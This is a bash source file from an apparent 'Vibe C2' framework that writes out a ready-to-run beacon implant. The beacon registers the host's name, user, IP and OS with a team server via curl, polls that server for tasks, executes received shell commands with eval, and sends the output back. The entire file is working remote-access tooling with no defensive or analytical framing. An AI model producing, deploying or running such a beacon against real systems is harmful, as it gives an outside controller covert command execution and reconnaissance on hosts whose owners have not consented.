#!/bin/bash
# Vibe C2 - Bash Script Generator
# This script creates a self-contained bash script that can download and run the beacon

set -e
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
PROJECT_ROOT="$(realpath $SCRIPT_DIR/../..)"
OUTPUT_DIR="$PROJECT_ROOT/target/bash"

GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Default values
SERVER_URL="http://localhost:8080"
OUTPUT_FILE=""

print_banner() {
    echo -e "${CYAN}"
    echo "ðŸŒŠ  V I B E  C 2  F R A M E W O R K  ðŸŒŠ"
    echo "        Bash Beacon Generator"
    echo -e "${NC}"
}

print_help() {
    echo -e "${BLUE}Usage:${NC}"
    echo -e "  $0 [OPTIONS]"
    echo
    echo -e "${BLUE}Options:${NC}"
    echo -e "  ${YELLOW}--server-url URL${NC}    Team server URL (default: http://localhost:8080)"
    echo -e "  ${YELLOW}--output FILE${NC}       Output file path (default: target/bash/vibe_beacon.sh)"
    echo -e "  ${YELLOW}--help${NC}              Display this help message"
    echo
}

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        --server-url)
            SERVER_URL="$2"
            shift 2
            ;;
        --output)
            OUTPUT_FILE="$2"
            shift 2
            ;;
        --help)
            print_banner
            print_help
            exit 0
            ;;
        *)
            echo -e "${RED}[!]${NC} Unknown option: $1"
            print_help
            exit 1
            ;;
    esac
done

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Set default output file if not specified
if [ -z "$OUTPUT_FILE" ]; then
    OUTPUT_FILE="$OUTPUT_DIR/vibe_beacon.sh"
fi

# Generate the bash script beacon
generate_bash_beacon() {
    echo -e "${BLUE}[*]${NC} Generating bash script beacon..."
    
    # Create a minimal bash-based beacon script
    cat > "$OUTPUT_FILE" << 'EOF'
#!/bin/bash
# Vibe C2 Beacon - Bash Edition
# Auto-generated by Vibe C2 Framework

# Colors
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
print_banner() {
    echo -e "${CYAN}"
    echo "ðŸŒŠ  V I B E  C 2  F R A M E W O R K  ðŸŒŠ"
    echo "          Bash Beacon Client"
    echo -e "${NC}"
}

# Configuration
EOF
    
    # Add the server URL
    echo "SERVER_URL=\"$SERVER_URL\"" >> "$OUTPUT_FILE"
    
    cat >> "$OUTPUT_FILE" << 'EOF'
TEMP_DIR="/tmp/.vibe-c2-$(date +%s)"
SLEEP_TIME=30

# Create a unique beacon ID
generate_beacon_id() {
    local id=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 10)
    echo $id
}

# Gather system information
gather_system_info() {
    echo -e "${BLUE}[*]${NC} Gathering system information..."
    HOSTNAME=$(hostname)
    USERNAME=$(whoami)
    IP_ADDRESS=$(hostname -I 2>/dev/null || echo "Unknown")
    OS_INFO=$(uname -a)
    
    echo "Hostname: $HOSTNAME"
    echo "Username: $USERNAME"
    echo "IP: $IP_ADDRESS"
    echo "OS: $OS_INFO"
}

# Register with the team server
register_beacon() {
    echo -e "${BLUE}[*]${NC} Registering with team server..."
    
    local register_data="{\"hostname\":\"$HOSTNAME\",\"username\":\"$USERNAME\",\"ip\":\"$IP_ADDRESS\",\"os\":\"$OS_INFO\"}"
    
    # The server returns a plain string (beacon ID) on success
    BEACON_ID=$(curl -s -X POST -H "Content-Type: application/json" -d "$register_data" "$SERVER_URL/register" || echo "")
    
    # Remove any quotes that might be around the beacon ID
    BEACON_ID=$(echo $BEACON_ID | tr -d '"')
    
    if [ -z "$BEACON_ID" ]; then
        echo -e "${RED}[!]${NC} Failed to register with team server"
        return 1
    else
        echo -e "${GREEN}[+]${NC} Registered with ID: $BEACON_ID"
        return 0
    fi
}

# Check in with the team server
check_in() {
    echo -e "${BLUE}[*]${NC} Checking in with team server..."
    
    # The team server expects just the beacon ID string, not a JSON object with beacon_id field
    local response=$(curl -s -X POST -H "Content-Type: application/json" -d "\"$BEACON_ID\"" "$SERVER_URL/check_in" || echo "[]")
    
    if [ "$response" == "[]" ] || [ -z "$response" ]; then
        echo -e "${YELLOW}[*]${NC} No new tasks"
    else
        echo -e "${GREEN}[+]${NC} Received tasks"
        process_tasks "$response"
    fi
}

# Process tasks from the team server
process_tasks() {
    local tasks="$1"
    TASK_ID=""
    
    # Install jq if available for better JSON parsing
    if ! command -v jq &> /dev/null; then
        echo -e "${YELLOW}[!]${NC} jq not available, using basic parsing"
        # Basic parsing without jq
        # First, try to extract the task ID
        TASK_ID=$(echo "$tasks" | grep -o '"id"[[:space:]]*:[[:space:]]*"[^"]*"' | head -1 | sed 's/"id"[[:space:]]*:[[:space:]]*"\([^"]*\)"/\1/')
        echo -e "${BLUE}[*]${NC} Processing task ID: $TASK_ID"
        
        if echo "$tasks" | grep -q "shell"; then
            # Extract the command between quotes
            local cmd=$(echo "$tasks" | grep -o '"shell"[[:space:]]*:[[:space:]]*"[^"]*"' | sed 's/"shell"[[:space:]]*:[[:space:]]*"\([^"]*\)"/\1/')
            execute_shell_command "$cmd" "$TASK_ID"
        fi
        
        if echo "$tasks" | grep -q "sleep"; then
            # Extract the sleep time
            local sleep_time=$(echo "$tasks" | grep -o '"sleep"[[:space:]]*:[[:space:]]*[0-9]*' | grep -o '[0-9]*')
            if [ ! -z "$sleep_time" ]; then
                echo -e "${YELLOW}[*]${NC} Changing sleep time to $sleep_time seconds"
                SLEEP_TIME=$sleep_time
            fi
        fi
        
        if echo "$tasks" | grep -q "terminate"; then
            echo -e "${RED}[!]${NC} Terminating beacon"
            cleanup
            exit 0
        fi
    else
        # Advanced parsing with jq
        # Process each task in the array
        echo "$tasks" | jq -c '.[]' 2>/dev/null | while read -r task; do
            # Get the task ID
            local task_id=$(echo "$task" | jq -r '.id // "unknown"' 2>/dev/null)
            echo -e "${BLUE}[*]${NC} Processing task ID: $task_id"
            
            # Check for shell command
            local cmd=$(echo "$task" | jq -r '.command.Shell // empty' 2>/dev/null)
            if [ ! -z "$cmd" ]; then
                echo -e "${YELLOW}[*]${NC} Executing shell command: $cmd"
                execute_shell_command "$cmd" "$task_id"
            fi
            
            # Check for sleep command
            local sleep_time=$(echo "$task" | jq -r '.command.Sleep.seconds // empty' 2>/dev/null)
            if [ ! -z "$sleep_time" ]; then
                echo -e "${YELLOW}[*]${NC} Changing sleep time to $sleep_time seconds"
                SLEEP_TIME=$sleep_time
            fi
            
            # Check for terminate command
            if echo "$task" | jq -e '.command == "Terminate"' &>/dev/null; then
                echo -e "${RED}[!]${NC} Terminating beacon"
                cleanup
                exit 0
            fi
        done
    fi
}

# Execute a shell command
execute_shell_command() {
    local cmd="$1"
    local task_id="$2"
    echo -e "${YELLOW}[*]${NC} Executing command: $cmd"
    
    # Execute the command and capture output
    local output=$(eval "$cmd" 2>&1)
    
    # Log the output locally for debugging
    echo -e "${GREEN}[+]${NC} Command output: \n$output"
    
    # Send the response back to the team server
    send_response "$output" "$task_id"
    
    # Force an immediate check-in to deliver the response faster
    echo -e "${BLUE}[*]${NC} Forcing immediate check-in to deliver response..."
    check_in
}

# Send a command response to the team server using new command_output endpoint
send_response() {
    local result="$1"
    local task_id="$2"
    
    # Escape special characters for JSON
    result=$(printf '%s' "$result" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | sed 's/\n/\\n/g' | sed 's/\r/\\r/g' | sed 's/\t/\\t/g')
    
    # Format the response for the new command_output endpoint
    # If task_id is empty, use "unknown"
    [ -z "$task_id" ] && task_id="unknown"
    
    # Simple format for command_output: { beacon_id: string, task_id: string, output: string }
    local command_output="{\"beacon_id\":\"$BEACON_ID\",\"task_id\":\"$task_id\",\"output\":\"$result\"}"
    
    echo -e "${BLUE}[*]${NC} Sending response to server (task ID: $task_id)..."
    echo -e "${BLUE}[*]${NC} Command output data: $command_output"
    curl -v -X POST -H "Content-Type: application/json" -d "$command_output" "$SERVER_URL/command_output" 2>&1 | grep "< HTTP"
    echo -e "${GREEN}[+]${NC} Response sent to team server via command_output endpoint"
}

# Clean up before exiting
cleanup() {
    echo -e "${BLUE}[*]${NC} Cleaning up..."
    rm -rf "$TEMP_DIR" 2>/dev/null
}

# Set up trap for clean exit
trap cleanup EXIT INT TERM

# Main function
main() {
    print_banner
    
    # Create temporary directory
    mkdir -p "$TEMP_DIR"
    cd "$TEMP_DIR"
    
    # Gather system information
    gather_system_info
    
    # Register with the team server
    register_beacon
    if [ $? -ne 0 ]; then
        echo -e "${RED}[!]${NC} Registration failed, exiting"
        exit 1
    fi
    
    echo -e "${GREEN}[+]${NC} Beacon started with ID: $BEACON_ID"
    echo -e "${BLUE}[*]${NC} Connecting to: $SERVER_URL"
    echo -e "${BLUE}[*]${NC} Check-in interval: $SLEEP_TIME seconds"
    
    # Main beacon loop
    while true; do
        check_in
        sleep $SLEEP_TIME
    done
}

# Run the main function
main
EOF
    
    chmod +x "$OUTPUT_FILE"
    
    SIZE=$(du -h "$OUTPUT_FILE" | cut -f1)
    echo -e "${GREEN}[+]${NC} Bash script beacon generated successfully (${SIZE})."
    echo -e "${GREEN}[+]${NC} Output: $OUTPUT_FILE"
}

# Main execution
print_banner
generate_bash_beacon

echo -e "${CYAN}"
echo "ðŸŒŠ  V I B E  C 2  F R A M E W O R K  ðŸŒŠ"
echo "     Bash Beacon Build Complete!"
echo -e "${NC}"
echo -e "To use the bash beacon:"
echo -e "${YELLOW}  chmod +x $OUTPUT_FILE${NC}"
echo -e "${YELLOW}  $OUTPUT_FILE${NC}"
echo ""
